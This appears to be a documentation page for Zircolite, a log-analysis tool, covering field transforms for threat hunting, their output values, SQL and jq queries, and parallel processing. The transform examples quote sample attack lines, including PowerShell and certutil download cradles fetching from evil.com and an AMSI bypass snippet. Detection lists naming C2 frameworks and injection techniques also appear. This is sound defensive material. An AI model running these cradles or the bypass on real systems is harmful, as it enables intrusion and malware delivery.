# Advanced Use

## Field Transforms

Zircolite includes a **field transform system** that allows automatic enrichment and transformation of log field values during processing. Transforms are defined in `config/config.yaml` and execute Python code in a sandboxed environment using RestrictedPython.

### Overview

Transforms can:
- **Decode obfuscated data** (Base64, hex strings, URL encoding)
- **Extract IOCs** (URLs, IPs, domains, registry paths)
- **Detect attack indicators** (AMSI bypass, XOR encryption, shellcode patterns)
- **Enrich fields** (extract usernames, categorize ports, identify LOLBins)
- **Create alias fields** (add new fields without modifying originals)

### Enabling Transforms

Transforms require two settings in `config/config.yaml`:

```yaml
transforms_enabled: true

enabled_transforms:
  # Auditd transforms (Linux)
  - proctitle
  - cmd
  
  # Base64 decoding
  # - CommandLine_b64decoded
  # - ScriptBlockText_b64decoded
  
  # Process analysis
  # - Image_LOLBinMatch
  # - Image_TyposquatDetect
  
  # Security hunting
  # - CommandLine_AMSIBypass
  # - CommandLine_DownloadCradle
```

Only transforms listed in `enabled_transforms` will run. Uncomment transforms you want to enable.

### Transform Categories

Transforms can be enabled individually or by **category** using the `--transform-category` CLI option. Use `--all-transforms` to enable every defined transform. Use `--transform-list` to see all available categories.

```bash
# Enable all transforms in the commandline and process categories
python3 zircolite.py -e logs/ --transform-category commandline --transform-category process

# Enable ALL transforms at once
python3 zircolite.py -e logs/ --all-transforms

# List available categories and their transforms
python3 zircolite.py --transform-list
```

Categories are defined in the `transform_categories` section of `config/config.yaml` and can be customized.

### Inline vs External Transforms

Transforms can be defined in two ways:

**Inline** (`type: python`) -- code is written directly in `config.yaml`:

```yaml
- info: "Extract executable name"
  type: python
  code: |
    def transform(param):
        parts = param.replace('\\', '/').split('/')
        return parts[-1] if parts else param
  alias: true
  alias_name: "Image_ExeName"
  source_condition: [evtx_input, json_input]
```

**External file** (`type: python_file`) -- code is loaded from a `.py` file:

```yaml
- info: "Extract executable name"
  type: python_file
  file: image_exename.py
  alias: true
  alias_name: "Image_ExeName"
  source_condition: [evtx_input, json_input]
```

External files are resolved relative to the `transforms_dir` setting (default: `transforms/`, relative to the config file directory). Most built-in transforms ship as external files in `config/transforms/`.

The `transforms_dir` setting can be customized:

```yaml
transforms_dir: transforms/           # default
transforms_dir: /opt/zircolite/tfs/   # absolute path
transforms_dir: ../shared_transforms/ # relative to config dir
```

### Developing Custom Transforms

Use the included **transform tester** to develop and debug transforms locally:

```bash
# Test a transform file with a sample value
python config/transform_tester.py config/transforms/image_exename.py "C:\Windows\System32\cmd.exe"

# Interactive mode (enter values one at a time)
python config/transform_tester.py config/transforms/commandline_entropyscore.py --interactive

# List available builtins and modules in the sandbox
python config/transform_tester.py --list-builtins
```

The tester uses the exact same RestrictedPython sandbox as Zircolite, so if a transform works in the tester, it will work in Zircolite.

### Available Transforms

#### Auditd Transforms (`auditd`)

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `proctitle` | *(modifies original)* | Converts hex-encoded proctitle to ASCII |
| `cmd` | *(modifies original)* | Converts hex-encoded cmd to ASCII |

#### Command Line Transforms (`commandline`)

| Alias Field | Description |
|-------------|-------------|
| `CommandLine_b64decoded` | Decodes Base64 strings in command lines |
| `CommandLine_Extracted_Creds` | Extracts credentials from net/wmic/psexec commands |
| `CommandLine_URLs` | Extracts HTTP/HTTPS/FTP URLs |
| `CommandLine_RegistryPaths` | Extracts registry key paths |
| `CommandLine_Length` | Categorizes command line length: SHORT, NORMAL, LONG, VERY_LONG, EXTREME |
| `CommandLine_EntropyScore` | Shannon entropy score: LOW, MEDIUM, NORMAL, HIGH, VERY_HIGH |
| `CommandLine_XORIndicators` | Detects XOR operations and extracts keys |
| `CommandLine_AMSIBypass` | Detects AMSI bypass techniques |
| `CommandLine_HexStrings` | Finds and decodes hex-encoded strings |
| `CommandLine_EnvVarObfuscation` | Detects environment variable abuse |
| `CommandLine_DownloadCradle` | Identifies download cradle patterns |
| `CommandLine_EvasionTechniques` | Detects process hollowing, injection, etc. |
| `CommandLine_LateralMovement` | Detects PsExec, WMI, WinRM, RDP, SMB, SSH, DCOM usage |
| `CommandLine_DataStaging` | Detects exfiltration staging: archiving, bulk copy, DB dumps |
| `CommandLine_C2Indicators` | C2 framework fingerprints: Cobalt Strike, Metasploit, Sliver, etc. |
| `CommandLine_PersistenceCategory` | Categorizes persistence mechanisms (tasks, services, registry, cron) |
| `CommandLine_ReconIndicators` | Detects reconnaissance commands (systeminfo, ipconfig, etc.) |
| `CommandLine_ConcatDeobfuscate` | Deobfuscates caret escaping, string concat, format operators, backticks |
| `CommandLine_CryptoMining` | Detects stratum protocol, mining pools, wallet patterns, miner tools |
| `CommandLine_InjectionTechnique` | Classifies injection: classic, hollowing, APC, thread hijack, etc. |

#### Process Transforms (`process`)

| Alias Field | Description |
|-------------|-------------|
| `Image_ExeName` | Extracts executable name from path |
| `Image_LOLBinMatch` | Detects Living Off The Land Binaries |
| `Image_TyposquatDetect` | Detects typosquatted process names |
| `Image_PathAnomaly` | Flags processes running from Temp, AppData, Recycle Bin, etc. |
| `Image_StagingDirectory` | Tags execution from attacker staging directories |
| `Image_MasqueradeDetect` | Detects process name masquerading (svchost, lsass from wrong paths) |
| `ParentImage_ExeName` | Extracts parent executable name |
| `ParentImage_SpawnAnomaly` | Flags anomalous parent processes (Office, browsers, WMI) |

#### PowerShell Transforms (`powershell`)

| Alias Field | Description |
|-------------|-------------|
| `ScriptBlockText_b64decoded` | Decodes Base64 in PowerShell scripts |
| `ScriptBlockText_ObfuscationIndicators` | Detects char substitution, string concat, GzipStream, etc. |
| `ScriptBlockText_XORPatterns` | Detects XOR keys and patterns |
| `ScriptBlockText_ReflectionAbuse` | Detects reflection-based attacks |
| `ScriptBlockText_ShellcodeIndicators` | Detects shellcode execution patterns |
| `ScriptBlockText_NetworkIOCs` | Extracts IPs, URLs, and domains |
| `ScriptBlockText_StagerDetect` | Detects stagers: reflection loading, staged IEX, AppDomain abuse |
| `ScriptBlockText_PackerIndicators` | Detects packers/crypters: GZip, multi-layer encoding, Invoke-Obfuscation |

#### Network Transforms (`network`)

| Alias Field | Description |
|-------------|-------------|
| `QueryName_TLD` | Extracts TLD from DNS queries |
| `QueryName_EntropyScore` | Entropy score for DGA detection |
| `QueryName_TyposquatDetect` | Detects typosquatted official domains (gov, banks, tech) |
| `QueryName_SubdomainAnalysis` | DNS subdomain structure analysis: depth, hex/base64, entropy |
| `DestinationIp_ObfuscationCheck` | Detects hex/octal/decimal IP obfuscation |
| `DestinationPort_Category` | Categorizes ports (HTTP, SMB, RDP, METASPLOIT, etc.) |

#### File Transforms (`file`)

| Alias Field | Description |
|-------------|-------------|
| `TargetFileName_URLDecoded` | URL decodes file paths |
| `TargetFileName_DoubleExtension` | Detects double extension tricks (e.g., `invoice.pdf.exe`) |
| `TargetFileName_SensitiveFile` | Flags access to SAM, NTDS.dit, SSH keys, browser data, lsass dumps |

#### User and Authentication Transforms (`user`)

| Alias Field | Description |
|-------------|-------------|
| `User_Name` | Extracts username without domain |
| `User_Domain` | Extracts domain from user field |
| `LogonType_Description` | Maps logon type IDs to labels (INTERACTIVE, NETWORK, etc.) |

#### Hash Transforms (`hash`)

| Alias Field | Description |
|-------------|-------------|
| `Hash_MD5` | Extracts MD5 hash from Sysmon Hashes field |
| `Hash_SHA256` | Extracts SHA256 hash from Sysmon Hashes field |

#### Base64 Decoding Transforms (`base64`)

| Alias Field | Description |
|-------------|-------------|
| `CommandLine_b64decoded` | Decodes Base64 in command lines |
| `ScriptBlockText_b64decoded` | Decodes Base64 in PowerShell scripts |
| `Payload_b64decoded` | Decodes Base64 in payload fields |
| `ServiceFileName_b64decoded` | Decodes Base64 in service file names |

#### Registry Transforms (`registry`)

| Alias Field | Description |
|-------------|-------------|
| `TargetObject_SuspiciousRegistry` | Identifies persistence registry keys (Run, Services, IFEO, COM) |

#### Credentials Transforms (`credentials`)

| Alias Field | Description |
|-------------|-------------|
| `CommandLine_Extracted_Creds` | Extracts credentials from net/wmic/psexec commands |

### Using Transform Data After Zircolite Runs

Transforms produce enriched fields in both the SQLite database (during processing) and the JSON output file (`detected_events.json`). You can query these fields after a run using SQL (via `--dbfile` to keep the database) or `jq` on the JSON output.

#### SQL Queries (with `--dbfile`)

Keep the SQLite database after processing with `--dbfile events.db`, then query transforms directly:

```sql
-- Find obfuscated commands: long AND high entropy
SELECT * FROM logs
WHERE CommandLine_Length LIKE 'EXTREME%'
  AND CommandLine_EntropyScore LIKE 'VERY_HIGH%'
```

```sql
-- Timeline of lateral movement
SELECT SystemTime, CommandLine, CommandLine_LateralMovement
FROM logs
WHERE CommandLine_LateralMovement != ''
ORDER BY SystemTime
```

```sql
-- Find potential C2 framework usage
SELECT SystemTime, Image, CommandLine, CommandLine_C2Indicators
FROM logs
WHERE CommandLine_C2Indicators LIKE '%COBALT_STRIKE%'
   OR CommandLine_C2Indicators LIKE '%METASPLOIT%'
```

```sql
-- Classify injection techniques
SELECT DISTINCT CommandLine_InjectionTechnique, COUNT(*) as count
FROM logs
WHERE CommandLine_InjectionTechnique != ''
GROUP BY CommandLine_InjectionTechnique
```

#### jq Queries (on detected_events.json)

The JSON output is an array of detection objects. Each has `title`, `rule_level`, `tags`, `count`, and `matches` (an array of event dicts with all fields including transform aliases).

**Extract all unique LOLBins seen across all detections:**

```bash
jq -r '[.[].matches[].Image_LOLBinMatch // empty] | unique | .[]' detected_events.json
```

**Find events where base64 was detected but could not be decoded (potential shellcode/encrypted payloads):**

```bash
jq '[.[].matches[] | select(.CommandLine_b64decoded == "b64_detected_cannot_decode")]
    | map({SystemTime, Image, CommandLine})' detected_events.json
```

**List all events with high entropy command lines (obfuscation indicator):**

```bash
jq '[.[].matches[] | select(.CommandLine_EntropyScore | startswith("HIGH") or startswith("VERY_HIGH"))]
    | map({SystemTime, CommandLine, CommandLine_EntropyScore})' detected_events.json
```

**Extract network IOCs from PowerShell detections:**

```bash
jq -r '[.[].matches[] | select(.ScriptBlockText_NetworkIOCs != null and .ScriptBlockText_NetworkIOCs != "")]
    | map(.ScriptBlockText_NetworkIOCs) | unique | .[]' detected_events.json
```

**Lateral movement timeline:**

```bash
jq '[.[].matches[] | select(.CommandLine_LateralMovement != null and .CommandLine_LateralMovement != "")]
    | sort_by(.SystemTime)
    | .[] | {SystemTime, User, CommandLine_LateralMovement}' detected_events.json
```

**Export all C2 indicators with context to CSV-friendly format:**

```bash
jq -r '.[].matches[] | select(.CommandLine_C2Indicators != null and .CommandLine_C2Indicators != "")
    | [.SystemTime, .Computer, .User, .Image, .CommandLine_C2Indicators] | @csv' detected_events.json
```

**Find suspicious registry persistence across all rules:**

```bash
jq '[.[].matches[] | select(.TargetObject_SuspiciousRegistry != null and .TargetObject_SuspiciousRegistry != "")]
    | group_by(.TargetObject_SuspiciousRegistry)
    | map({category: .[0].TargetObject_SuspiciousRegistry, count: length, first_seen: (map(.SystemTime) | sort | first)})
    | sort_by(-.count)' detected_events.json
```

**Combine multiple transform fields for triage (process + command line analysis):**

```bash
jq '[.[].matches[] | select(.Image_LOLBinMatch != null and .Image_LOLBinMatch != "")]
    | map({
        time: .SystemTime,
        lolbin: .Image_LOLBinMatch,
        entropy: .CommandLine_EntropyScore,
        length: .CommandLine_Length,
        download: .CommandLine_DownloadCradle,
        urls: .CommandLine_URLs
      })' detected_events.json
```

### Transform Output Values Reference

Transforms produce specific indicator values that can be used for filtering and hunting. Here's a reference of the values produced by each security transform:

#### `ScriptBlockText_ObfuscationIndicators` Values

| Value | Description |
|-------|-------------|
| `CHAR_SUBST` | Character substitution (e.g., `` `I`E`X ``) |
| `STR_CONCAT` | String concatenation (e.g., `'Inv'+'oke'`) |
| `JOIN_OP` | `-Join` operator obfuscation |
| `FORMAT_STR` | Format string obfuscation (`-f`) |
| `VAR_SUBST` | Variable substitution in strings (`${...}`) |
| `ENC_CMD` | Encoded command (`-enc`, `-encodedcommand`) |
| `GZIPSTREAM` | GzipStream compression |
| `FROMBASE64` | FromBase64String method |
| `IO_COMPRESSION` | IO.Compression namespace usage |
| `DEFLATESTREAM` | DeflateStream compression |
| `MEMORYSTREAM` | MemoryStream usage |

#### `CommandLine_DownloadCradle` Values

| Value | Description |
|-------|-------------|
| `DOWNLOADSTRING` | `DownloadString()` method |
| `DOWNLOADFILE` | `DownloadFile()` method |
| `DOWNLOADDATA` | `DownloadData()` method |
| `INVOKE_WEBREQUEST` | `Invoke-WebRequest` / `iwr` |
| `INVOKE_RESTMETHOD` | `Invoke-RestMethod` / `irm` |
| `WEBCLIENT` | WebClient class usage |
| `BITSTRANSFER` | BitsTransfer module |
| `CERTUTIL_DOWNLOAD` | Certutil with `-urlcache` |
| `BITSADMIN_DOWNLOAD` | Bitsadmin with `/transfer` |
| `CURL_WGET` | curl or wget usage |

#### `CommandLine_AMSIBypass` Values

| Value | Description |
|-------|-------------|
| `AMSI_REF` | Any AMSI reference |
| `AMSI_INIT_FAILED` | AmsiInitFailed bypass |
| `AMSI_CONTEXT` | amsiContext manipulation |
| `AMSI_SCAN_BUFFER` | AmsiScanBuffer bypass |
| `AMSI_REFLECTION` | Reflection-based AMSI bypass |
| `AMSI_DLL` | amsi.dll reference |

#### `CommandLine_EvasionTechniques` Values

| Value | Description |
|-------|-------------|
| `PROCESS_HOLLOWING` | NtUnmapViewOfSection / ZwUnmapViewOfSection |
| `REFLECTIVE_DLL` | ReflectiveLoader pattern |
| `TOKEN_MANIPULATION` | AdjustTokenPrivileges / SetThreadToken |
| `MEMORY_ALLOC` | VirtualAlloc / NtAlloc / ZwAlloc |
| `REMOTE_THREAD` | CreateRemoteThread |
| `SYSCALL` | Direct syscall / ntdll usage |
| `ETW_BYPASS` | ETW / NtTraceEvent bypass |

#### `ScriptBlockText_ShellcodeIndicators` Values

| Value | Description |
|-------|-------------|
| `EXEC_MEMORY_ALLOC` | VirtualAlloc with 0x40 (PAGE_EXECUTE_READWRITE) |
| `KERNEL32_REF` | kernel32.dll reference |
| `NTDLL_REF` | ntdll.dll reference |
| `CREATE_THREAD` | CreateThread call |
| `NOP_SLED` | NOP sled pattern (0x90, 0x90) |
| `MEMORY_COPY` | Marshal.Copy / RtlMoveMemory / CopyMemory |
| `POINTER_OP` | IntPtr / Marshal.AllocHGlobal |

#### `TargetObject_SuspiciousRegistry` Values

| Value | Description |
|-------|-------------|
| `RUN_KEY` | Run / RunOnce registry keys |
| `SERVICE_KEY` | Services registry keys |
| `IFEO` | Image File Execution Options |
| `APPINIT_DLLS` | AppInit_DLLs |
| `WINLOGON` | Winlogon registry keys |
| `COM_HIJACK` | CLSID / InProcServer (COM hijacking) |
| `SCHED_TASK` | Scheduled task cache |
| `SECURITY_POLICY` | Security policies |

#### `DestinationPort_Category` Values

| Value | Description |
|-------|-------------|
| `HTTP` | Port 80 |
| `HTTPS` | Port 443 |
| `SMB` | Port 445 |
| `RDP` | Port 3389 |
| `SSH` | Port 22 |
| `WINRM` | Ports 5985, 5986 |
| `METASPLOIT_DEFAULT` | Port 4444 |
| `ALT_HTTP` | Ports 8080, 8443 |
| `EPHEMERAL` | Ports 49152+ |

#### `Image_TyposquatDetect` Values

| Value | Description |
|-------|-------------|
| `TYPOSQUAT:<process>(HOMOGLYPH)` | Homoglyph substitution (0→o, 1→l/i, rn→m, vv→w) |
| `TYPOSQUAT:<process>(CHAR_ADD)` | Character addition at start/end |
| `TYPOSQUAT:<process>(CHAR_OMIT)` | Character omission |
| `TYPOSQUAT:<process>(CHAR_SWAP)` | Single character substitution |

**Processes monitored**: svchost, lsass, csrss, services, explorer, powershell, cmd, certutil, rundll32, chrome, and other high-value targets.

**False positive prevention**: The transform includes a comprehensive whitelist of ~100+ legitimate Windows executables (wevtutil, vssadmin, netstat, etc.) that will never be flagged, even if they have similar names to monitored processes.

#### `QueryName_TyposquatDetect` Values

| Value | Description |
|-------|-------------|
| `TYPOSQUAT_GOV_US:<domain>(...)` | US Government domain typosquat (irs, ssa, usps, fbi, etc.) |
| `TYPOSQUAT_GOV_UK:<domain>(...)` | UK Government domain typosquat (hmrc, nhs, dvla) |
| `TYPOSQUAT_GOV_EU:<domain>(...)` | EU Government domain typosquat |
| `TYPOSQUAT_BANK:<domain>(...)` | Banking/Finance domain typosquat (chase, paypal, etc.) |
| `TYPOSQUAT_CRYPTO:<domain>(...)` | Cryptocurrency domain typosquat (coinbase, binance) |
| `TYPOSQUAT_TECH:<domain>(...)` | Tech company domain typosquat (microsoft, google, apple) |
| `TYPOSQUAT_EMAIL:<domain>(...)` | Email provider domain typosquat (gmail, outlook) |
| `TYPOSQUAT_CLOUD:<domain>(...)` | Cloud service domain typosquat (office365, azure, aws) |
| `TYPOSQUAT_SECURITY:<domain>(...)` | Security vendor domain typosquat |
| `TYPOSQUAT_SHIPPING:<domain>(...)` | Shipping company domain typosquat (fedex, ups, dhl) |
| `SUSPICIOUS_TLD:<tld>` | Suspicious TLD combined with typosquat (tk, xyz, etc.) |

**Techniques detected**:
- `HOMOGLYPH` - Similar looking characters (0/o, 1/l/i, rn/m, vv/w)
- `CHAR_MANIP` - Character addition or removal
- `CHAR_SWAP` - Character substitution
- `AFFIX` - Prefix/suffix added to legitimate domain
- `EMBEDDED` - Legitimate domain embedded in longer string

#### Extended Transform Output Values

##### `CommandLine_Length` Values
`SHORT:<n>`, `NORMAL:<n>`, `LONG:<n>`, `VERY_LONG:<n>`, `EXTREME:<n>` (where `<n>` is the character count)

##### `CommandLine_EntropyScore` Values
`LOW:<score>`, `MEDIUM:<score>`, `NORMAL:<score>`, `HIGH:<score>`, `VERY_HIGH:<score>` (Shannon entropy)

##### `Image_PathAnomaly` Values
`TEMP_DIR`, `WINDOWS_TEMP`, `USER_TEMP`, `APPDATA`, `DOWNLOADS`, `USER_DESKTOP`, `USER_MEDIA_DIR`, `RECYCLE_BIN`, `PUBLIC_PROFILE`, `PERFLOGS`

##### `Image_StagingDirectory` Values
`STAGING:ProgramData`, `STAGING:WindowsTemp`, `STAGING:RootTemp`, `STAGING:PerfLogs`, `STAGING:VendorFolder`, `STAGING:PublicProfile`, `STAGING:RecycleBin`, `STAGING:UNC_Path`, `STAGING:LinuxTmp`, `STAGING:DevShm`

##### `CommandLine_LateralMovement` Values
`LATERAL:PSEXEC`, `LATERAL:REMOTE_SERVICE`, `LATERAL:WMI`, `LATERAL:WINRM`, `LATERAL:RDP`, `LATERAL:SMB`, `LATERAL:SSH`, `LATERAL:DCOM`, `LATERAL:AT_REMOTE`

##### `CommandLine_DataStaging` Values
`STAGING:ARCHIVE`, `STAGING:BULK_COPY`, `STAGING:DB_DUMP`, `STAGING:EMAIL_COLLECT`, `STAGING:FILE_HUNT`, `STAGING:AD_DUMP`

##### `CommandLine_C2Indicators` Values
`C2:COBALT_STRIKE`, `C2:METASPLOIT`, `C2:SLIVER`, `C2:EMPIRE`, `C2:HAVOC`, `C2:GENERIC_PIPE`, `C2:COVENANT`

##### `CommandLine_PersistenceCategory` Values
`PERSIST:SCHED_TASK`, `PERSIST:SERVICE`, `PERSIST:REG_RUN`, `PERSIST:WMI_SUB`, `PERSIST:STARTUP_FOLDER`, `PERSIST:DLL_SEARCH`, `PERSIST:CRON`, `PERSIST:SYSTEMD`, `PERSIST:LAUNCH_AGENT`, `PERSIST:BOOT`

##### `CommandLine_ReconIndicators` Values
`RECON:SYSINFO`, `RECON:NETWORK`, `RECON:USER_ENUM`, `RECON:DOMAIN`, `RECON:SHARE`, `RECON:PROCESS`, `RECON:SECURITY`

##### `QueryName_SubdomainAnalysis` Values
`DNS:DEEP_SUB:<depth>`, `DNS:LONG_SUB:<length>`, `DNS:HEX_SUBDOMAIN`, `DNS:B64_SUBDOMAIN`, `DNS:HIGH_ENTROPY_SUB`, `DNS:NUMERIC_SUB`

##### `ScriptBlockText_StagerDetect` Values
`STAGER:REFLECTION_LOAD`, `STAGER:STAGED_IEX`, `STAGER:INMEMORY_NET`, `STAGER:AMSI_THEN_EXEC`, `STAGER:APPDOMAIN`, `STAGER:RUNSPACE`, `STAGER:CLM_BYPASS`, `STAGER:WIN32_API`

##### `CommandLine_ConcatDeobfuscate` Values
`DEOBF:CARET`, `DEOBF:CONCAT:<reconstructed>`, `DEOBF:FORMAT_OP`, `DEOBF:BACKTICK`, `DEOBF:ENV_SUBSTR`

##### `CommandLine_CryptoMining` Values
`MINING:PROTOCOL`, `MINING:POOL:<name>`, `MINING:WALLET:MONERO`, `MINING:WALLET:BITCOIN`, `MINING:WALLET:ETHEREUM`, `MINING:TOOL:<name>`, `MINING:MINER_ARGS`

##### `ScriptBlockText_PackerIndicators` Values
`PACKER:GZIP`, `PACKER:DEFLATE`, `PACKER:MULTI_ENCODE`, `PACKER:NESTED_IEX`, `PACKER:CUSTOM_ENCODING`, `PACKER:REVERSAL`, `PACKER:VAR_SUBSTITUTION`, `PACKER:INVOKE_OBFUSCATION`, `PACKER:SECURESTRING`

##### `CommandLine_InjectionTechnique` Values
`INJECT:CLASSIC`, `INJECT:ALLOC_WRITE`, `INJECT:HOLLOWING`, `INJECT:APC`, `INJECT:THREAD_HIJACK`, `INJECT:CALLBACK`, `INJECT:MAPPING`, `INJECT:ETW_BYPASS`, `INJECT:SHELLCODE_ALLOC`

##### `Image_MasqueradeDetect` Values
`MASQUERADE:<exe_name>` (e.g., `MASQUERADE:svchost.exe`, `MASQUERADE:lsass.exe`) — flags the process name when running from a non-standard directory.

##### `TargetFileName_DoubleExtension` Values
`DOUBLE_EXT:<ext1>.<ext2>` (e.g., `DOUBLE_EXT:pdf.exe`, `DOUBLE_EXT:docx.scr`)

##### `TargetFileName_SensitiveFile` Values
`SENSITIVE:CREDENTIAL_STORE`, `SENSITIVE:NTDS`, `SENSITIVE:SSH_KEY`, `SENSITIVE:CERT_PRIVATE`, `SENSITIVE:BROWSER_DATA`, `SENSITIVE:CONFIG`, `SENSITIVE:MEMORY_DUMP`

##### `ParentImage_SpawnAnomaly` Values
`ANOMALY:OFFICE_SPAWN`, `ANOMALY:BROWSER_SPAWN`, `ANOMALY:PDF_SPAWN`, `ANOMALY:SCRIPT_CHAIN`, `ANOMALY:WMI_SPAWN`, `ANOMALY:TASK_SPAWN`, `ANOMALY:JAVA_SPAWN`

##### `LogonType_Description` Values
`SYSTEM`, `INTERACTIVE`, `NETWORK`, `BATCH`, `SERVICE`, `UNLOCK`, `NETWORK_CLEARTEXT`, `NEW_CREDENTIALS`, `REMOTE_INTERACTIVE`, `CACHED_INTERACTIVE`

### Transform Examples

#### Example 1: Detecting PowerShell Download Cradles

When processing a PowerShell command like:
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
```

The `CommandLine_DownloadCradle` transform produces:
```
DOWNLOADSTRING|WEBCLIENT
```

And `CommandLine_URLs` extracts:
```
http://evil.com/mal.ps1
```

#### Example 2: XOR Key Detection

For a command containing XOR operations:
```powershell
$decoded = $bytes | ForEach-Object { $_ -bxor 0x35 }
```

The `ScriptBlockText_XORPatterns` transform detects:
```
XOR_KEY:0x35|XOR_LOOP|COMMON_XOR_KEY:0x35
```

#### Example 3: AMSI Bypass Detection

When AMSI bypass code is detected:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

The `CommandLine_AMSIBypass` transform flags:
```
AMSI_REF|AMSI_REFLECTION
```

#### Example 4: LOLBin Detection

For a process execution:
```
C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.com/file.exe
```

The `Image_LOLBinMatch` transform identifies:
```
LOLBIN:certutil
```

#### Example 5: Detecting Compressed/Encoded PowerShell

For obfuscated PowerShell using compression:
```powershell
[IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($data)))
```

The `ScriptBlockText_ObfuscationIndicators` transform flags:
```
GZIPSTREAM|MEMORYSTREAM|FROMBASE64|IO_COMPRESSION
```

#### Example 6: Network IOC Extraction

For a script containing network indicators:
```powershell
$client.DownloadFile("http://192.168.1.100:8080/payload.exe", "C:\temp\payload.exe")
```

The `ScriptBlockText_NetworkIOCs` transform extracts:
```
IP:192.168.1.100|URL:http://192.168.1.100:8080/payload.exe
```

#### Example 7: Process Typosquatting Detection

When a malicious process tries to masquerade as a legitimate Windows binary:
```
C:\Users\Public\svch0st.exe
```

The `Image_TyposquatDetect` transform identifies:
```
TYPOSQUAT:svchost(HOMOGLYPH)
```

Other examples:
- `1sass.exe` → `TYPOSQUAT:lsass(HOMOGLYPH)`
- `chr0me.exe` → `TYPOSQUAT:chrome(HOMOGLYPH)`
- `svchosts.exe` → `TYPOSQUAT:svchost(CHAR_ADD)`
- `powersh3ll.exe` → `TYPOSQUAT:powershell(HOMOGLYPH)`

**Note**: Legitimate Windows tools like `wevtutil.exe` will NOT be flagged as typosquats of `certutil.exe` due to the built-in whitelist.

#### Example 8: Domain Typosquatting Detection

When DNS queries reveal potential phishing domains:
```
micros0ft-support.xyz
```

The `QueryName_TyposquatDetect` transform identifies:
```
TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz
```

Other examples:
- `paypa1.com` → `TYPOSQUAT_BANK:paypal(HOMOGLYPH)`
- `irs-gov.tk` → `TYPOSQUAT_GOV_US:irs(AFFIX)|SUSPICIOUS_TLD:tk`
- `arnazon.com` → `TYPOSQUAT_TECH:amazon(CHAR_SWAP)`
- `gooogle.com` → `TYPOSQUAT_TECH:google(CHAR_MANIP)`
- `nhs-uk.info` → `TYPOSQUAT_GOV_UK:nhs(AFFIX)`

### Querying Transform Results

Transform alias fields are stored in the database and can be queried with SQL or SIGMA rules:

```sql
-- Find commands with download cradles
SELECT * FROM logs WHERE CommandLine_DownloadCradle != ''

-- Find PowerShell with XOR operations
SELECT * FROM logs WHERE ScriptBlockText_XORPatterns LIKE '%XOR_KEY%'

-- Find AMSI bypass attempts
SELECT * FROM logs WHERE CommandLine_AMSIBypass LIKE '%AMSI%'

-- Find high-entropy DNS queries (potential DGA)
SELECT * FROM logs WHERE CAST(QueryName_EntropyScore AS REAL) > 75

-- Find typosquatted process names (masquerading)
SELECT * FROM logs WHERE Image_TyposquatDetect != ''

-- Find typosquatted government domains (phishing)
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%GOV_%'

-- Find typosquatted banking domains
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%BANK%'

-- Find domain typosquats with suspicious TLDs
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%SUSPICIOUS_TLD%'
```

### Creating Custom Transforms

You can add custom transforms in `config/config.yaml`:

```yaml
transforms:
  MyField:
    - info: "Description of transform"
      type: python
      code: |
        def transform(param):
            # Your Python code here
            # param contains the field value
            # Return the transformed value
            return transformed_value
      alias: true  # Create new field (true) or modify original (false)
      alias_name: "MyField_Transformed"
      source_condition:
        - evtx_input
        - json_input
      enabled: true
```

#### Transform Best Practices

1. **Keep transforms fast** - They run on every matching event
2. **Return empty string on no match** - Makes filtering easier
3. **Use aliases for new data** - Don't modify original evidence
4. **Handle exceptions** - Return original value on error
5. **Limit output size** - Truncate long results

---

## Working with Large Datasets

Zircolite processes each log file separately in its own database by default, which reduces memory usage for large datasets.

### Automatic Processing Optimization

Zircolite automatically analyzes your workload and optimizes processing. When you run Zircolite with multiple files, it:

1. **Analyzes your files** - counts files, measures sizes, checks available RAM and CPU cores
2. **Selects optimal database mode** - unified (all files in one DB) vs. per-file (separate DB per file)
3. **Enables parallel processing** - when beneficial, automatically processes files in parallel with optimal worker count

```shell
# Auto-optimization happens by default
python3 zircolite.py --evtx ./logs/ --ruleset rules/rules_windows_sysmon.json

# Example output:
[+] Analyzing workload...
  [>] Files       4 (478.2 MB total, avg 119.6 MB)
  [>] System      33.7 GB RAM available, 10 CPUs
  [>] DB Mode     PER-FILE
  				  Few large files detected (4 files, avg 119.6 MB)
  [>] Parallel    ENABLED (4 workers)
```

#### Database Mode Selection Heuristics

The automatic mode selection uses the following rules:

| Condition | Mode Selected | Reason |
|-----------|---------------|--------|
| Single file | Per-file | No benefit from unified mode |
| Low RAM (<2 GB available) | Per-file | Safer for memory-constrained systems |
| Total data > Available RAM / 3 | Per-file | Avoid out-of-memory errors |
| Many small files (>10 files, avg <5 MB) | Unified | Less overhead, enables cross-file correlation |
| Few large files (<5 files, avg >50 MB) | Per-file | Memory efficient processing |
| High RAM (>8 GB) + multiple files | Unified | Faster overall processing |

#### Controlling Processing Mode

```shell
# Disable automatic mode selection (use default per-file mode)
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-auto-mode

# Force unified database mode (enables cross-file rule correlation)
python3 zircolite.py --evtx logs/ --ruleset rules.json --unified-db

# Disable parallel processing
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-parallel

# Set specific worker count
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 4
```

### Parallel Processing

Zircolite automatically enables parallel processing when it's beneficial. The parallel processor:

- **Calculates optimal workers** based on available memory, CPU cores, and file sizes
- **Monitors memory** during processing and can throttle if approaching limits
- **Uses threads** for I/O-bound EVTX parsing (process-based parallelism was deprecated due to compatibility issues)
- **Falls back to sequential** if parallel isn't beneficial (single file, low memory)

#### Parallel Processing Heuristics

| Condition | Parallel | Reason |
|-----------|----------|--------|
| Single file | Disabled | No benefit |
| Very low RAM (<1 GB) | Disabled | Safety |
| Memory per file > 60% usable RAM | Disabled | Prevent OOM |
| Multiple files + sufficient memory | Enabled | Faster processing |

#### Manual Parallel Configuration

```shell
# Set maximum workers
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 8

# Set memory threshold for throttling (default: 75%)
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-memory-limit 80
```

### Streaming Mode

Zircolite includes a **streaming mode** (enabled by default) that combines extraction, flattening, and database insertion into a single pass.

#### How Streaming Mode Works

